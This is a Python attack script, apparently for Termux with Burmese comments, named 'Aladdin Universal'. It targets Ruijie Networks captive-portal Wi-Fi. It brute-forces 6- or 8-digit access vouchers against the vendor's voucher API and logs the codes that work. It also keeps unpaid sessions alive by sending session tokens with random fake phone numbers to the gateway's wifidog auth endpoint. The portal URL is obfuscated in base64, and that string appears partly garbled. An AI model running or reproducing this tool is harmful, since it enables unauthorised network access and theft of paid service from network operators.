import os
import re
import sys
import base64
import random
import string
import time
import asyncio
import aiohttp
import requests
import urllib3

# SSL Error ပိတ်ခြင်း (ဖုန်းအဟောင်းများအတွက်)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# အရောင်များ
w, g, y, r, b = "\033[1;00m", "\033[1;32m", "\033[1;33m", "\033[1;31m", "\033[1;34m"

# --- FIX: FOLDER STRUCTURE & PATH ---
# GitHub ကနေ Clone လုပ်တဲ့အခါ Path လွဲတာကို ကာကွယ်ဖို့ 
# ဖိုင်တွေကို Termux ရဲ့ Home folder ထဲမှာ အသေသွားသိမ်းမယ်
HOME_PATH = os.path.expanduser("~") 
IP_FILE = os.path.join(HOME_PATH, ".aladdin_ip") # ဖိုင်နာမည်ကိုပါ သီးသန့်ပေးထားတယ်
SUCCESS_FILE = os.path.join(HOME_PATH, "aladdin_success.txt")

def Logo():
    os.system("clear")
    print(f"{b}    ___    __    ___    ____  ____  _____  _   __")
    print(f"   /   |  / /   /   |  / __ \/ __ \/  _/ |/ / / /")
    print(f"  / /| | / /   / /| | / / / / / / // / |   / / / ")
    print(f" / ___ |/ /___/ ___ |/ /_/ / /_/ // / /   |/_/  ")
    print(f"/_/  |_/_____/_/  |_/_____/_____/___//_/|_/(_)  {w}")
    print(f"{g}           [ ALADDIN UNIVERSAL v12.1 ]{w}")
    print("-" * 50)

async def get_session_id(session, session_url):
    headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K)'}
    try:
        async with session.get(session_url, headers=headers, timeout=15, ssl=False) as req:
            match = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(req.url))
            return match.group(1) if match else None
    except: return None

class AladdinTool:
    def __init__(self):
        raw_url = b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3dpZmlkb2c/c3RhZ2U9cG9ydGFsJmd3X2lkPTU4YjRiYmNiZmQwZCZnd19zbj1IMVU0MFNYMDExNTA3Jmd3X2FkZHJlc3M9MTkyLjE2OC45OS4xJmd3X3BvcnQ9MjA2MCZpcD0xOTIuMTY4Ljk5LjU0Jm1hYz0zYTpkZDo3ZTo2NDo4NzozNiZzbG90X251bT0xMyZuYXNpcD0xOTIuMTY4LjEuMTczJnNzaWQ9VkxBTjk5JnVzdGF0ZT0wJm1hY19yZXE9MSZ1cmw9aHR0cCUzQSUyRiUyRjE5Mi4xNjguMC4xJTJGJmNoYXBfaWQ9JTVDMzEwJmNoYXBfY2hhbGxlbmdlPSU1QzIxNiU1QzE2MCU1QzEyMiU1QzE3NyU1QzIxNyU1QzM2MCU1QzM2MyU1QzMyMSU1QzA1NiU1QzExMyU1QzIzMiU1QzIyMSU1QzMzMiU1QzCheck license_system'
        # မူရင်း URL ကို decode လုပ်ခြင်း
        try:
            self.session_url = base64.b64decode(raw_url).decode('utf-8', errors='ignore')
        except:
            self.session_url = ""
            
        # IP ကို ဖတ်တဲ့အခါ Path Fixed လုပ်ထားတဲ့ နေရာကနေပဲ ဖတ်မယ်
        if os.path.exists(IP_FILE):
            with open(IP_FILE, "r") as f:
                self.ip = f.read().strip()
        else:
            self.ip = "192.168.0.1"

    async def keep_alive(self):
        Logo()
        print(f"{g}[+] Internet Keep-Alive Running...{w}")
        print(f"{y}[*] Target IP: {self.ip}{w}")
        connector = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            session_id = None
            while True:
                if not session_id:
                    session_id = await get_session_id(session, self.session_url)
                
                if session_id:
                    params = {'token': session_id, 'phoneNumber': '09'+''.join(random.choice(string.digits) for _ in range(8))}
                    try:
                        async with session.post(f"http://{self.ip}:2060/wifidog/auth?", params=params, timeout=10) as res:
                            print(f"{w}[{time.strftime('%H:%M:%S')}] Status: {res.status} - Online{w}")
                    except: session_id = None
                await asyncio.sleep(5)

    async def voucher_hack(self, length):
        Logo()
        print(f"{g}[+] Hacking {length}-Digit Vouchers...{w}")
        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as session:
            session_id = None
            while True:
                if not session_id:
                    session_id = await get_session_id(session, self.session_url)
                if session_id:
                    code = "".join(random.choice(string.digits) for _ in range(length))
                    data = {"accessCode": code, "sessionId": session_id, "apiVersion": 1}
                    try:
                        async with session.post("https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US", json=data, timeout=10) as req:
                            res = await req.json()
                            if 'logonUrl' in str(res):
                                print(f"\n{g}[SUCCESS] Found: {code}{w}")
                                with open(SUCCESS_FILE, "a") as f: f.write(f"{code}\n")
                            else:
                                print(f"{w}[TRYING] {code}", end='\r')
                    except: pass
                await asyncio.sleep(0.1)

def setup_process():
    Logo()
    print(f"{y}[*] Detecting Network...{w}")
    try:
        # Gateway ရှာဖွေခြင်း logic
        r = requests.get("http://192.168.0.1", timeout=10, verify=False)
        # URL ထဲမှာ gw_address ပါမပါ စစ်မယ်
        if "gw_address" in r.url:
            ip = re.search('gw_address=(.*?)&', r.url).group(1)
            with open(IP_FILE, "w") as f: f.write(ip)
            print(f"{g}[+] Setup Success! IP: {ip}{w}")
            print(f"{g}[+] Configuration saved in Home Directory.{w}")
        else:
            print(f"{r}[!] Could not find Gateway in URL. Manual IP needed.{w}")
    except Exception as e:
        print(f"{r}[!] Connection Failed: {str(e)}{w}")
    time.sleep(2)

if __name__ == "__main__":
    tool = AladdinTool()
    while True:
        Logo()
        print("[1] Start Setup (Run this first)")
        print("[2] Internet Keep-Alive")
        print("[3] Voucher Hack (6 Digit)")
        print("[4] Voucher Hack (8 Digit)")
        print("[0] Exit")
        choice = input(f"\n{y}Select > {w}")
        if choice == '1': setup_process(); tool = AladdinTool() # IP အသစ်ကို ပြန် load လုပ်ဖို့
        elif choice == '2':
            try: asyncio.run(tool.keep_alive())
            except KeyboardInterrupt: pass
        elif choice in ['3', '4']:
            length = 6 if choice == '3' else 8
            try: asyncio.run(tool.voucher_hack(length))
            except KeyboardInterrupt: pass
        elif choice == '0': break
      
